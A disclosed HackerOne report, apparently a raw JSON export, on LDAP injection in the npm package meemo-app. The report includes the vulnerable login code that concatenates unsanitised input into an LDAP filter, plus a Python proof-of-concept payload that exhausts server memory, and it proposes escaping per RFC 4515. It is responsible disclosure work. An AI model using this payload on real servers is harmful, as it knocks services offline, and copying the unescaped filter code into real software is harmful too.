{"id":907311,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDczMTE=","url":"https://hackerone.com/reports/907311","title":"[meemo-app] Denial of Service via LDAP Injection","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-06-24T22:00:27.123Z","submitted_at":"2020-06-24T22:00:27.123Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"d3lla","url":"/d3lla","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-22T08:48:33.856Z","bug_reporter_agreed_on_going_public_at":"2020-08-22T08:48:33.814Z","team_member_agreed_on_going_public_at":"2020-08-21T20:49:43.007Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report `Denial of service via LDAP Injection` vulnerability in `meemo-app` module.\nIt allows a malicious attacker to send a crafted input that is interpreted as an LDAP filter, leading to Denial of Service.\n\n# Module\n\n**module name:** `meemo-app`\n**version:** `1.9.2`\n**npm page:** `https://www.npmjs.com/package/meemo-app`\n\n## Module Description\n\nMeemo is a personal data manager. It lets you simply input any kind of information like notes, thoughts, ideas as well as acts as a bookmarkmanager and todo list. The user interface resembles a news feed organized with tags. Full text search further allows you to quickly find information in your pile of accumulated data.\n\nFor better bookmarking, there are chrome and firefox webextensions available.\n\n## Module Stats\n\n[1] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe module is vulnerable to a DoS via LDAP Injection.\nThe causes of this vulnerability are the same of another report here #906959.\n\n\nBelow the vulnerable code:\n\n```javascript\n...\nfunction verify(username, password, callback) {\n    profile(username, true, function (error, result) {\n        if (error) return callback(error);\n\n        if (process.env.CLOUDRON_LDAP_URL) {\n            var ldapClient = ldapjs.createClient({ url: process.env.CLOUDRON_LDAP_URL });\n            ldapClient.on('error', function (error) {\n                console.error('LDAP error', error);\n                callback(new UserError(UserError.INTERNAL_ERROR, error));\n            });\n\n            var ldapDn = 'cn=' + result.username + ',' + process.env.CLOUDRON_LDAP_USERS_BASE_DN;\n\n            ldapClient.bind(ldapDn, password, function (error) {\n                if (error) return callback(new UserError(UserError.NOT_AUTHORIZED));\n\n                callback(null, { user: result });\n            });\n        } else {\n            bcrypt.compare(password, result.passwordHash, function (error, valid) {\n                if (error) return callback(new UserError(UserError.INTERNAL_ERROR, error));\n                if (!valid) return callback(new UserError(UserError.NOT_AUTHORIZED));\n\n                // strip passwordHash\n                delete result.passwordHash;\n\n                callback(null, { user: result });\n            });\n        }\n    });\n}\n\n// https://github.com/nebulade/meemo/blob/master/src/users.js#L84\n// identifier may be userId, email, username\nfunction profile(identifier, full, callback) {\n    assert.strictEqual(typeof identifier, 'string');\n    assert.strictEqual(typeof full, 'boolean');\n    assert.strictEqual(typeof callback, 'function');\n\n    if (process.env.CLOUDRON_LDAP_URL) {\n        var ldapClient = ldapjs.createClient({ url: process.env.CLOUDRON_LDAP_URL });\n        ldapClient.on('error', function (error) {\n            console.error('LDAP error', error);\n        });\n\n        ldapClient.bind(process.env.CLOUDRON_LDAP_BIND_DN, process.env.CLOUDRON_LDAP_BIND_PASSWORD, function (error) {\n            if (error) return callback(new UserError(UserError.INTERNAL_ERROR, error));\n\n            ldapClient.search(process.env.CLOUDRON_LDAP_USERS_BASE_DN, { filter: '(|(uid=' + identifier + ')(mail=' + identifier + ')(username=' + identifier + ')(sAMAccountName=' + identifier + '))' }, function (error, result) {  //\u003c-- INJECTION: identifier is not sanitized\n                if (error) return callback(new UserError(UserError.INTERNAL_ERROR, error));\n\n                var items = [];\n\n                result.on('searchEntry', function(entry) {\n                    items.push(entry.object);\n                });\n\n                result.on('error', function (error) {\n                    callback(new UserError(UserError.INTERNAL_ERROR, error));\n                });\n\n                result.on('end', function (result) {\n                    if (result.status !== 0) return callback(new UserError(UserError.NOT_FOUND, 'non-zero status from LDAP search: ' + result.status));\n                    if (items.length === 0) return callback(new UserError(UserError.NOT_FOUND, 'No LDAP entries found'));\n\n                    if (full) return callback(null, items[0]);\n\n                    var out = {\n                        username: items[0].username,\n                        displayName: items[0].displayname,\n                        email: items[0].mail\n                    };\n\n                    callback(null, out);\n                });\n            });\n        });\n...\n\n```\n\n```javascript\n...\nexports = module.exports = {\n    auth: auth,\n    login: login,\n    logout: logout,\n    profile: profile,\n\n...\n// https://github.com/nebulade/meemo/blob/master/src/routes.js#L86\nfunction login(req, res, next) {\n    if (typeof req.body.username !== 'string' || !req.body.username) return next(new HttpError(400, 'missing username'));\n    if (typeof req.body.password !== 'string' || !req.body.password) return next(new HttpError(400, 'missing password'));\n\n    users.verify(req.body.username, req.body.password, function (error, result) {\n        if (error \u0026\u0026 error.code === UserError.NOT_FOUND) return next(new HttpError(401, 'invalid credentials'));\n        if (error \u0026\u0026 error.code === UserError.NOT_AUTHORIZED) return next(new HttpError(401, 'invalid credentials'));\n        if (error) return next(new HttpError(500, error));\n\n        req.session.userId = result.user.username;\n\n        var token = uuid.v4();\n        tokens.add(token, '', result.user.username, function (error) {\n            if (error) return next(new HttpError(500, error));\n            next(new HttpSuccess(201, { token: token, user: result.user }));\n        });\n    });\n}\n...\n```\n\n```javascript\n// https://github.com/nebulade/meemo/blob/master/app.js#L55\n...\nrouter.post('/api/login', routes.login);\n...\n```\n## Steps To Reproduce:\n\nTo test this app on a real live system, you need first to install `Cloudron` (https://cloudron.io/get.html) and then install the `Meemo` app (https://cloudron.io/store/de.nebulon.guacamoly.html). In order to install the `Cloudron` app you need first a domain. \n\nInstead of the above setting, I tested the app locally. \nBelow steps to reproduce the vulnerability.\n\nTo simulate an LDAP server for users authentication, I used a test server provided by the same author (https://github.com/nebulade/ldapjstestserver) (you can find attached).\n\n- install (https://docs.mongodb.com/manual/tutorial/install-mongodb-on-ubuntu/) and start MongoDB:\n    - `sudo systemctl start mongod`\n\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `meemo-app` module:\n    -  `git clone https://github.com/nebulade/meemo.git`\n    - `cd meemo`\n    - `npm i`\n    - `./node_modules/.bin/gulp`\n\n- start the LDAP test server (we are in `poc/meemo/`):\n    -  `node ldapjstestserver.js`\n\n- start the `meemo` app locally (we need to setup some environment variables to enable the LDAP authentication):\n    - `CLOUDRON_LDAP_BIND_DN=\"cn=admin,ou=users,dc=example\" CLOUDRON_LDAP_BIND_PASSWORD=\"password\" CLOUDRON_LDAP_USERS_BASE_DN=\"ou=users,dc=example\" CLOUDRON_LDAP_URL=\"ldap://localhost:3002\" node app.js`\n\nBefore performing the attack let's first check that everything works as expected:\n- visit `http://localhost:3000/`\n- enter `normal` and `test` respectively in the `username` and `password` fields and the click enter\n- logout \n\nReproduce the attack:\n- visit `http://localhost:3000/`\n- run the following `python` script (`poc.py`):\n\n```python\nimport requests\nimport json\n\nurl = 'http://localhost:3000/api/login'\n\npayload = \"*)\" + \"(cn=*)\"*700000 + \"(cn=*\"\n\nprint(f\"Payload's length: {len(payload)} characters\")\n\nheaders = {'Content-type': 'application/json', 'Accept': 'text/plain'}\n\ndata = {\n    \"username\": payload,\n    \"password\": \"pass\"\n}\n\nresponse = requests.post(url, data=json.dumps(data), headers=headers)\n```\n- the page will load until the server crashes. After some time you will get the following error:\n`FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory`\n\nIf an attacker send one (like in my case) or multiple requests like in the previous example, he/she could potentially makes the service unavaible and consumes all the server resources, leading to DoS.\n\n{F881601}\n\n## Patch\nSanitize the user input before using it to build LDAP filters.\n\nPossible solution could be for example this one (taken from another project):\n- Github Issue: [Vulnerable to ldap injection](https://github.com/vesse/node-ldapauth-fork/issues/21)\n- Github Commit: [Sanitize user input: Replace the specific special characters with codes as defined in LDAP specification.](https://github.com/vesse/node-ldapauth-fork/commit/3feea43e243698bcaeffa904a7324f4d96df60e4) \n\nInspired by the same issue (https://github.com/vesse/node-ldapauth-fork/issues/21), here there are the RFC specifications (https://tools.ietf.org/search/rfc4515#section-3):\n```\n    The rule ensures that the entire filter string is a\n    valid UTF-8 string and provides that the octets that represent the\n    ASCII characters \"*\" (ASCII 0x2a), \"(\" (ASCII 0x28), \")\" (ASCII\n    0x29), \"\" (ASCII 0x5c), and NUL (ASCII 0x00) are represented as a\n    backslash \"\" (ASCII 0x5c) followed by the two hexadecimal digits\n    representing the value of the encoded octet.\n\n    This simple escaping mechanism eliminates filter-parsing ambiguities\n    and allows any filter that can be represented in LDAP to be\n    represented as a NUL-terminated string. Other octets that are part\n    of the set may be escaped using this mechanism, for example,\n    non-printing ASCII characters.\n\n    For AssertionValues that contain UTF-8 character data, each octet of\n    the character to be escaped is replaced by a backslash and two hex\n    digits, which form a single octet in the code of the character. For\n    example, the filter checking whether the \"cn\" attribute contained a\n    value with the character \"\" anywhere in it would be represented as\n    \"(cn=\\2a*)\".\n\n    As indicated by the rule, implementations MUST escape\n    all octets greater than 0x7F that are not part of a valid UTF-8\n    encoding sequence when they generate a string representation of a\n    search filter. Implementations SHOULD accept as input strings that\n    are not valid UTF-8 strings. This is necessary because RFC 2254 did\n    not clearly define the term \"string representation\" (and in\n    particular did not mention that the string representation of an LDAP\n    search filter is a string of UTF-8-encoded Unicode characters).\n```\n\n\n\n\n## Supporting Material/References:\n\nSome helpful resources I used for this research:\n- [LDAP injection](https://en.wikipedia.org/wiki/LDAP_injection)\n- [LDAP Filters](https://ldap.com/ldap-filters/)\n- [BlackHat: LDAP Injection \u0026 Blind LDAP Injection](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)\n- [Understanding and Defending Against LDAP Injection Attacks](https://ldap.com/2018/05/04/understanding-and-defending-against-ldap-injection-attacks/)\n- [LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)\n- [Ldapjs - orfilter](http://ldapjs.org/filters.html#orfilter)\n\nMy setup:\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.2.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nDenial of service","vulnerability_information_html":"\u003cp\u003eI would like to report \u003ccode\u003eDenial of service via LDAP Injection\u003c/code\u003e vulnerability in \u003ccode\u003emeemo-app\u003c/code\u003e module.\u003cbr\u003e\nIt allows a malicious attacker to send a crafted input that is interpreted as an LDAP filter, leading to Denial of Service.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e \u003ccode\u003emeemo-app\u003c/code\u003e\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e \u003ccode\u003e1.9.2\u003c/code\u003e\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/meemo-app\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003eMeemo is a personal data manager. It lets you simply input any kind of information like notes, thoughts, ideas as well as acts as a bookmarkmanager and todo list. The user interface resembles a news feed organized with tags. Full text search further allows you to quickly find information in your pile of accumulated data.\u003c/p\u003e\n\n\u003cp\u003eFor better bookmarking, there are chrome and firefox webextensions available.\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e[1] weekly downloads\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eThe module is vulnerable to a DoS via LDAP Injection.\u003cbr\u003e\nThe causes of this vulnerability are the same of another report here \u003ca href=\"/reports/906959\"\u003e#906959\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eBelow the vulnerable code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003everify\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003epassword\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eprofile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003etrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLOUDRON_LDAP_URL\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eldapClient\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eldapjs\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateClient\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e \u003cspan class=\"na\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLOUDRON_LDAP_URL\u003c/span\u003e \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003eldapClient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eerror\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eLDAP error\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eINTERNAL_ERROR\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\n            \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eldapDn\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ecn=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLOUDRON_LDAP_USERS_BASE_DN\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n            \u003cspan class=\"nx\"\u003eldapClient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebind\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eldapDn\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003epassword\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eNOT_AUTHORIZED\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\n                \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"na\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003ebcrypt\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecompare\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epassword\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epasswordHash\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003evalid\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eINTERNAL_ERROR\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003evalid\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eNOT_AUTHORIZED\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\n                \u003cspan class=\"c1\"\u003e// strip passwordHash\u003c/span\u003e\n                \u003cspan class=\"k\"\u003edelete\u003c/span\u003e \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epasswordHash\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n                \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"na\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// https://github.com/nebulade/meemo/blob/master/src/users.js#L84\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e// identifier may be userId, email, username\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003eprofile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eidentifier\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eassert\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estrictEqual\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003etypeof\u003c/span\u003e \u003cspan class=\"nx\"\u003eidentifier\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003estring\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eassert\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estrictEqual\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003etypeof\u003c/span\u003e \u003cspan class=\"nx\"\u003efull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eboolean\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eassert\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estrictEqual\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003etypeof\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003efunction\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan 